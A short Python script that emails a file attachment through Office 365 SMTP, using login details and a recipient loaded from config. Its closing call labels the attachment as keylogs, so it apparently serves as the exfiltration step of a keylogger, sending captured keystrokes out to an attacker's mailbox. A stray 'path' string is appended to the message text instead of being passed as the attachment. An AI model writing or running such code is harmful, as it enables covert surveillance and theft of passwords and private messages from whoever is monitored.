import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os.path
from decouple import config

login_name = config('NAME')
login_password = config('PASSWORD')
recipient = config('RECIPIENT')
path = config('PATH')
attach = config('ATTACHMENT')

def send_email(recipient, subject, message, attachment_path = attach):
    sender = login_name
    # basic information about the email being sent
    msg = MIMEMultipart()
    msg['From'] = sender
    msg['To'] = recipient
    msg['Subject'] = subject
    # reading in the attachment
    msg.attach(MIMEText(message, 'plain'))

    if attachment_path != '':
        filename = os.path.basename(attachment_path)
        attachment = open(attachment_path, "rb")
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(part)

    try:
        server = smtplib.SMTP('smtp.office365.com', 587)
        server.ehlo()
        server.starttls()
        server.login(login_name, login_password)
        text = msg.as_string()
        server.sendmail(sender, recipient, text)
        print('email sent')
        server.quit()
    except:
        print("SMTP server connection error")
    return True

send_email(recipient,'PyMail','This email was sent using Pyhton. Sending attachment with keylogs.''path')
